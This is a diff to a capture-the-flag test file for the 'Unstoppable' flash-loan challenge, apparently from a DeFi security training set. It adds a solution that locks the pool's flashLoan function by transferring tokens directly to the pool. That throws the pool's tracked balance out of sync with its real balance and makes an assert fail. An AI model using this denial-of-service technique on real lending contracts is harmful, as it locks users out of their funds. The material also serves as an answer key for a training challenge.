@@ -33,13 +33,21 @@ describe('[Challenge] Unstoppable', function () {
             await this.token.balanceOf(attacker)
         ).to.be.bignumber.equal(INITIAL_ATTACKER_BALANCE);
 
-         // Show it's possible for anyone to take out a flash loan
-         this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
-         await this.receiverContract.executeFlashLoan(10, { from: someUser });
+        // Show it's possible for anyone to take out a flash loan
+        this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
+        await this.receiverContract.executeFlashLoan(10, { from: someUser });
     });
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+
+        // PoA:
+        // transfer DVT to pool directly through DVT transferFrom
+        // by bypassing UnstoppableLender.depositTokens the pool balance will get out of sync
+        // with the balance of the pool in the DVT contract and the assert in flashLoan() will fail
+
+        // transfer DVT from attacker to pool
+        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, { from: attacker });
     });
 
     after(async function () {
